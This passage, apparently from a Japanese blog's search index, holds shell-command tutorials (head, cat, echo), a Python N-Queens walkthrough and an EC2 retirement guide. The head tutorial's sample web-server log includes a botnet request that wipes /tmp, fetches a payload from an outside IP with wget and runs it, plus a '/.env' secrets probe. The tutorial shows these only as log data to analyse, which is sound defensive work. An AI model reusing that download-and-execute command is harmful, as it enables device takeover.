[28/Nov/2021:03:10:13 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.17.106 - - [28/Nov/2021:03:10:25 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.44.102 - - [28/Nov/2021:03:10:43 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.17.106 - - [28/Nov/2021:03:10:55 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] \u0026#34;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1\u0026#34; 302 230 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154\u0026#34; 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] \u0026#34;CONNECT guba.eastmoney.com:443 HTTP/1.1\u0026#34; 302 215 \u0026#34;-\u0026#34; \u0026#34;Apache-HttpClient/4.1 (java 1.5)\u0026#34; : : : AWSのロードバランサーからの定期的なポーリングが多いのでgrep -v で除去します。\ngrepコマンドの -v オプションは「除外する」という意味です。-i オプションは大文字小文字を区別しないという意味です。\nsuzuki$ sudo cat /var/log/httpd/access_log | grep -v \u0026#34;ELB-HealthChecker\u0026#34; | head 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] \u0026#34;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1\u0026#34; 302 230 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154\u0026#34; 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] \u0026#34;CONNECT guba.eastmoney.com:443 HTTP/1.1\u0026#34; 302 215 \u0026#34;-\u0026#34; \u0026#34;Apache-HttpClient/4.1 (java 1.5)\u0026#34; 117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] \u0026#34;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1\u0026#34; 302 230 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154\u0026#34; 117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] \u0026#34;CONNECT guba.eastmoney.com:443 HTTP/1.1\u0026#34; 302 215 \u0026#34;-\u0026#34; \u0026#34;Apache-HttpClient/4.1 (java 1.5)\u0026#34; 98.244.147.169 - - [28/Nov/2021:03:13:12 +0900] \u0026#34;GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws\u0026#34; 400 226 \u0026#34;-\u0026#34; \u0026#34;-\u0026#34; 61.136.101.77 - - [28/Nov/2021:03:15:39 +0900] \u0026#34;GET http://dushu.baidu.com HTTP/1.1\u0026#34; 302 208 \u0026#34;-\u0026#34; \u0026#34;-\u0026#34; 135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] \u0026#34;POST / HTTP/1.1\u0026#34; 302 205 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34; 135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] \u0026#34;GET /.env HTTP/1.1\u0026#34; 302 209 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34; 61.136.101.133 - - [28/Nov/2021:03:17:46 +0900] \u0026#34;GET http://dushu.baidu.com HTTP/1.1\u0026#34; 302 208 \u0026#34;-\u0026#34; \u0026#34;-\u0026#34; 164.90.204.15 - - [28/Nov/2021:03:20:54 +0900] \u0026#34;CONNECT www.yahoo.com:443 HTTP/1.1\u0026#34; 302 210 \u0026#34;-\u0026#34; \u0026#34;Go-http-client/1.1\u0026#34; suzuki$ それっぽいログが出るようになりました。\n次にどこからのアクセスが多いのかを絞り込みます。\nsuzuki$ sudo cat /var/log/httpd/access_log | grep -v \u0026#34;ELB-HealthChecker\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{ print $2; }\u0026#39; | head GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1 CONNECT guba.eastmoney.com:443 HTTP/1.1 GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1 CONNECT guba.eastmoney.com:443 HTTP/1.1 GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws GET http://dushu.baidu.com HTTP/1.1 POST / HTTP/1.1 GET /.env HTTP/1.1 GET http://dushu.baidu.com HTTP/1.1 CONNECT www.yahoo.com:443 HTTP/1.1 suzuki$ GETとPOSTの項目に絞り込まれました。\nawk コマンドの -F はセパレータで、この場合は \u0026lsquo;\u0026quot;\u0026rsquo; を区切り文字として２番目の値を出力するという意味になります。最後のheadは確認は出力の冒頭だけで十分なのでつけています。\n次は、GET, CONNECT, POSTなどのコマンドを除去します。\nawkコマンドのデフォルトのセパレーターは空白なので、空白区切りで数えると二つ目を表す $2 を使って絞り込みます。\nsuzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v \u0026#34;ELB-HealthChecker\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{ print $2; }\u0026#39; | awk \u0026#39;{ print $2; }\u0026#39; | head http://guba.eastmoney.com/list,hk01500_1.html guba.eastmoney.com:443 http://guba.eastmoney.com/list,hk01500_1.html guba.eastmoney.com:443 /shell?cd+/tmp;rm+-rf+*;wget+ http://dushu.baidu.com / /.env http://dushu.baidu.com www.yahoo.com:443 suzuki$ 次に、余計な出力を抑制します。\nここでは空白行を出力したくないので grep -v ^$ を使っています。\n非常によく使うオプションなので覚えておくとよいです。\nヒント grep -v ^$ 空行を出力しない 行頭を表す「^」と行末を表す「$」の間に何もないですね。 では、同様にgrep -vで アスタリスクとスラッシュだけの行を絞り込みます。\nsuzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v \u0026#34;ELB-HealthChecker\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{ print $2; }\u0026#39; | awk \u0026#39;{ print $2; }\u0026#39;| grep -v ^$ | grep -v [*/] |s ort| head 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 suzuki$ 最後に、出力をアルファベット順に並べ替えます。sortでよいです。\nさらに uniq コマンドで同じ複数のレコードを一つにするわけですが、 -c オプションを使うと、何件の複数のレコードを一つにまとめたのかを、行頭に示してくれます。\nそして sort -nr の -n は、行頭の数値、いわゆるuniq -c でまとめた件数を数値として並べ替えるという意味です。-r は、リバース、いわゆる逆順ソートですね。ここでは、件数の多いものから順番に出力します。headコマンドはデフォルトが１０検出力なので、head -n10 と書いてもよいですし、省略して head だけでもよいです。\nsuzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v \u0026#34;ELB-HealthChecker\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{ print $2; }\u0026#39; | awk \u0026#39;{ print $2; }\u0026#39;|sort|uniq -c|sort -nr | head 850 http://dushu.baidu.com 839 /form.cgi 485 http://www.baidu.com/pub/css/new_font.css 477 / 265 * 258 guba.eastmoney.com:443 253 209 /.env 200 www.yahoo.com:443 184 istock.jrj.com.cn:443 suzuki$ ヒント :sudo cat filename | grep -v \u0026ldquo;除去したい文字列\u0026rdquo; | awk \u0026lsquo;{ print $2; }\u0026rsquo;| sort | uniq -c |sort -nr | head これはもはや定番中の定番です。覚えましょう。体に叩き込みましょう。 head コマンドの紹介の割には長くなりました。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-10T10:23:14+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-10-01-head-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-10-01-head-suzuki/","title":"（３）【head】シェルスクリプトコマンド活用紹介"},{"content":"catコマンド ファイルの内容を表示する ファイルの内容を行番号付きで表示する 複数ファイルを連結して1つのファイルにする 概要 「cat」は、「conCATenate（つなぐ、連結する）」のcatです。ファイルを連結するためのコマンドですが、ファイルの内容を表示する際によく使われます。\n$ cat ＜ファイル名＞ catコマンドの書式 cat [オプション] ファイル1 ファイル2……\ncatコマンドの主なオプション catコマンドの主なオプションは次の通りです。\nオプション 長いオプション 意味 -n \u0026ndash;number 行番号を付け加える -b \u0026ndash;number-nonblank 行番号を付け加える。ただし空白行には付けない -s \u0026ndash;squeeze-blank 連続した空行を1行にする ヒント 一画面に収まらない長いファイルの場合は、lessコマンドを使うと便利です。 catコマンド詳細説明 ファイルの内容を出力 filenameの内容をターミナルに出力します。\n$ cat filename 長いファイルの場合は、lessコマンドを使います。\n$ cat filename | less ファイルの結合 複数のファイルを結合（連結）させて別ファイルへ出力します。\n$ cat filename1 filname2 \u0026gt; filename3 追記したい場合は「\u0026raquo;」を使います。\n$ cat filename1 filname2 \u0026gt;\u0026gt; filename3 ヒント 「\u0026gt;」をリダイレクト、「\u0026raquo;」をアペンドと言います。「\u0026gt;」はファイルを新規作成してファイルへ出力します。「\u0026raquo;」は既存のファイルへ追記出力します。 「\u0026gt;」は、内容があってもファイルの内容を空にして出力することに注意しなくてはなりません。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-09T12:59:39+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-09-01-cat-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-09-01-cat-suzuki/","title":"（２）【cat】シェルスクリプトコマンド活用紹介"},{"content":"mainメソッド概要 今回は前回から引き続きバックトラックを説明していきたいと思います。\nプログラムソースは以下のURLにあります。\nhttps://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py03_nqueen.py\n429-437行目でグローバル変数を宣言した後に呼び出されるのは486行目のmainメソッドです。\n467-484行目のmainメソッドの内容を見てみましょう。 nmin=4からMAX=15まで複数のNについて探索し、解の数と実行時間を出力します。\n以下が出力結果です。\nN: Total Unique hh:mm:ss.ms 4: 2 0 0:00:00.000 5: 10 0 0:00:00.000 6: 4 0 0:00:00.000 7: 40 0 0:00:00.001 8: 92 0 0:00:00.004 9: 352 0 0:00:00.019 10: 724 0 0:00:00.088 11: 2680 0 0:00:00.439 12: 14200 0 0:00:02.345 13: 73712 0 0:00:13.412 14: 365596 0 0:01:21.331 NがNQueenのN数、Totalが解の総数、Uniqueは左右反転ミラー、回転で同じ形のものを同一解として計算した場合の数、\nhh:mm:ss.msは各Nごとに処理にかかった時間です。\nUniqueは今回は全て0ですがロジックが進んでいくとまずUnique数を算出してそこからTotalを求めるようになりますので今の所は流しておいてください。\nエイトクイーン(N=8)の解の数は8: の92、実行時間は4msとなります。\nブルートフォースが3m7.321s、配置フラグが0m0.554sでしたから格段に高速になったことがわかると思います。\nmainメソッド詳細 メソッドの中身を見ていきましょう。\n459行目 nmin=4 でスタートするNの数を指定しています。\n461行目 for i in range(nmin,MAX): でnmin=4からMAX=15まで1ずつインクリメントしてnqueenを実行していきます。\n462,463行目でfor文の冒頭でTOTAL,UNIQUEを0で初期化しています。 これをしとかないと出力されるTotal,Uniqueの数が累計数になってしまいますので注意しましょう。\n464,465行目でABOARD配列を初期化しています。ABOARD配列は各行のどこにクイーンを置いたかを記憶するための配列です。ロジックが進んでいくと必須の配列になるのですが、今回のロジックでは使用しませんので読み飛ばしてください。\n467行目でnqueenメソッドを呼び出しています。\n今までは引数はrow=0の行情報1つだけでしたが、今回から複数のNについてNqueenを実行するようになるので第2引数にsizeが追加されています。\nsizeは461行目のfor i in range(nmin,MAX)のiで渡します。\n466行目,468-470行目でnqueenメソッドの前後時間を計測してメソッドの実行にかかった時間を算出しています。\ndatetime.now()で現在時刻が取得できます。\n466行目でstart_timeにnqueenメソッド呼び出し直前の時間を取得しておき、\n468行目でメソッド終了直後の現在時刻とstart_timeを引くことによってメソッドの実行にかかった時間をtime_elapsedとして算出しています。\n469行目で\u0026rsquo;{}\u0026rsquo;.format としていますがこれはtime_elapsedがdatetimeオブジェクトなのでstringにキャストしています。\nformat関数は、文字列中の{ }の場所に、引数をにstringキャストして埋め込むことができるみたいです。\n470行目で下３桁を切り捨てています。\nstringは配列の扱いなのでスライスできるみたいです\n[:-3]\nですと、0文字目から後ろから3文字除いた範囲を取り出しています。\n例えば以下のようになります。\n0:00:00.005309\n0:00:00.005\n基本的にformat関数は、文字列中の「{ }」の場所に、引数をstringにキャストして埋め込む\ntext = _text[:-3] スライス機能　先頭から末尾3文字を除いた文字列を切り取る\nnqueenメソッドについて プログラムの内容は基本的に前回の配置フラグと同じです。\n違うのは以下の2点です。\n1つ目は450,451,453行目です。\n前回は配置フラグとして上下の利き筋だけチェックするFAだけ使っていました。\n今回は、FAの他に左対角線の利き筋をチェックするFB、右対角線の利き筋をチェックするFCも使用しています。\n2つ目445行目です。\n前回までは最終行まで行ったらprintOutメソッドでCOUNT数と各行のクイーンの配置場所を出力していました。\n今回はTOTAL +=1 として正解数に1加算しています。\nFA,FB,FCの配置フラグのチェックを通過して最終行まで辿り着ければ正解としてカウントして良いと言えるからです。\n次回は図で説明しながら実際の動きを追ってみましょう。\n","date":"2022-02-09T12:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-08-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-08-01-ani/","title":"第6回 pythonでNQueen（エイトクイーン）バックトラック（２）"},{"content":"echoコマンド メッセージや環境変数を表示します。 概要 「echo」はメッセージなどを表示するコマンドです。\n$echo メッセージ でメッセージを表示します。\n$ echo $変数名 で環境変数やシェルスクリプト内の変数を表示する際にも使用います。\nechoコマンドの書式 echo [オプション] メッセージ\nechoの主なオプション オプション 意味 -n 最後の改行を出力しない -e エスケープを解釈する -E エスケープを解釈しない（デフォルト） echo コマンド詳細説明 echoコマンドの使用：\nさまざまなオプションでechoコマンドを使用できます。\n次の例では、いくつかの便利なオプションについて説明します。\nオプションなしで「echo」コマンドを使用すると、デフォルトで改行が追加されます。\n\u0026lsquo;-n\u0026rsquo;オプションは、改行なしでテキストを印刷するために使用されます。\n\u0026lsquo;-e\u0026rsquo;オプションは、出力からバックスラッシュ文字を削除するために使用されます。\n\u0026rsquo;echo_example.sh\u0026rsquo;という名前の新しいbashファイルを作成し、次のスクリプトを追加します。\n#!/bin/bash echo \u0026#34;改行付きのテキストの印刷\u0026#34;; echo -n \u0026#34;改行なしのテキストの印刷\u0026#34;; echo -e \u0026#34;\\n削除\\tバックスラッシュ\\t文字\\n\u0026#34;; bashコマンドでファイルを実行します。\n$ bash echo_example.sh 改行付きのテキストの印刷 改行なしのテキストの印刷 削除\tバックスラッシュ\t文字 $ Hello World はじめてのbashコマンド「echo」\nターミナルで非常に単純なbashステートメントを実行します。 コマンドの出力は「Hello, World」になります。\n$ echo \u0026#34;Hello, World\u0026#34;; Hello, World $ はじめてのbashスクリプト「vim」\n$ vim HelloWorld.sh ＜空のvim HelloWorld.sh が開きます＞ vimで開いたHelloWorld.shを編集します。\n#!/bin/bash echo \u0026#34;Hello World\u0026#34;; ヒント echo の後ろに続く文字列は 「\u0026quot;\u0026quot;」（ダブるクォーテーション）または、「\u0026rsquo;\u0026rsquo;」（シングルクォーテーション）で囲みましょう。 行末の「;」（セミコロン）も忘れずに。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-09T11:32:07+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-09-01-echo-suzki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-09-01-echo-suzki/","title":"（１）【echo】シェルスクリプトコマンド活用紹介"},{"content":"みなさんの中にもAWSのEC2を使った事がある人もいるかと思います。\nそのAWSからある日、下記のようなメールが届きました。\nHello,\nEC2 has detected degradation of the underlying hardware hosting your Amazon EC2 instance (instance-ID: [インスタンスのID]) associated with your AWS account (AWS Account ID: [ID]) in the [リージョンの場所] region.\nDue to this degradation your instance could already be unreachable.\nWe will stop your instance after 日付 UTC.\nPlease take appropriate action before this time.\nThe affected instances are listed below:\n[インスタンスのID]\n翻訳してみると、どうやらAWSの老朽化に伴うインスタンスの更新が必要なようです。\nこんにちは。\nEC2は、[リージョンの場所]リージョンにあるお客様のAWSアカウント（AWSアカウントID：[ID]）に関連するAmazon EC2インスタンス（インスタンスID：Instance-ID）をホストする基礎ハードウェアの劣化を検出しました。\nこの劣化により、お客様のインスタンスはすでに到達不能になっている可能性があります。日付 UTC以降にお客様のインスタンスを停止します。\nそれまでに適切な対処をお願いいたします。\n影響を受けるインスタンスは以下の通りです。\n[インスタンスのID]\n老朽化の通知をしてくれるのは非常にありがたいですが、EC2の適切な対処ってなんだ？と焦ってしまう方もいるかと思います。\n今回は「Amazon EC2 Instance Retirement」というタイトルのメールが来た際の対処法について説明いたします。\nEC2のイベントを確認 まずはAWSにログインして、EC2の項目に移動します。\n左袖に、「イベント」という項目があるので、クリックして内容を確認しましょう。\n今回は「イベントステータス」部分に「Scheduled」と記述され、「イベントタイプ」が「instance-stop」となっている項目がありました。\nリソースIDをAWSのメールと照らし合わせて、該当のインスタンスということがわかります。\n「説明」の部分にも見切れていますが、「The instance is running on degraded hardware（インスタンスが劣化したハードウェアで動作している）」と記述されていました。\n進行状況から14日以内にインスタンスが停止してしまうので、「Amazon EC2 Instance Retirement」というメールが来たら、早めにAWSへログインして状況を確認するようにしましょう。\nEC2のルートを確認 次に、該当のインスタンスのルートデバイスタイプを確認します。\n前回のリソースID部分をクリックして、「インスタンスの概要」へ移動します。そして、「ストレージ」をクリックして「ルートデバイスタイプ」を確認しましょう。\nこの部分が「EBS」となっている場合は、対応が非常に簡単です。\nその対応を方法は次のようになります。\nEC2を停止、そして起動 「Amazon EC2 Instance Retirement」の対応はルートデバイスがEBSの場合は、対象のインスタンスを一度「インスタンスを停止」させてから「インスタンスを開始」するだけで対応できてしまいます。\n「インスタンスを停止」して「インスタンスを開始」だから、要するに「インスタンスを再起動」ってことでしょ？と考えてしまうかもしれません。\nしかし、「インスタンスを再起動」の場合はEC2のハードウェアが変わらないため、今回のハードウェアのアップデートが行われません。\nですので、「インスタンスを停止」させてから「インスタンスを開始」するようにして、EC2を実行するハードウェアをAWS側が自動的に変更するようにしましょう。\nルートデバイスタイプが「instant store」の場合 ルートデバイスが「instant store」の場合はEBSと対応が変わります。 まず、EC2インスタンスからイメージを作成します。 次に、さきほど作成したイメージを利用し、別のEC2インスタンスを立ち上げます。 そして、元のEC2インスタンスを削除します まとめ 「Amazon EC2 Instance Retirement」というメールが来た場合、焦らずに対応できるようにしておきましょう。\nEBSの場合は「インスタンスを停止」させてから「インスタンスを開始」。\ninstant storeの場合は、イメージを作成して、立ち上げて該当インスタンスを削除。\nこれさえ覚えておけば、大丈夫です。\nおすすめの書籍 図解即戦力 Amazon Web Servicesのしくみと技術がこれ1冊でしっかりわかる教科書 【「ITエンジニア本大賞2021」技術書部門 入賞! 】 Amazon Web Servicesのしくみがすぐにわかる! Amazon Web Services(AWS)のしくみや関連技術についてわかりやすく解説する図解本です。エンジニア1年生、IT業界などへの転職・就職を目指す人が、AWS関連の用語、しくみ、クラウドとネットワークの基礎技術などを一通り学ぶことのできる、1冊目の入門書としてふさわしい内容を目指します。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 要点整理から攻略する『AWS認定 データベース-専門知識』 (Compass Booksシリーズ) 「AWS 認定 データベース」に頻出する内容を1冊にまとめました! ■AWS認定とは AWS 認定試験は、AWSに関する知識・スキルを測るための試験です。レベル別・カテゴリー別に認定され、基礎コース・アソシエイト・プロフェッショナルの3つのレベルと、ネットワークやセキュリティなど分野ごとの専門知識(スペシャリティ)があります。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-08T09:39:37+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/catch_hu6ec1216b51b2643d3fa27f0b3095cdf9_137560_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/","title":"Amazon EC2 Instance 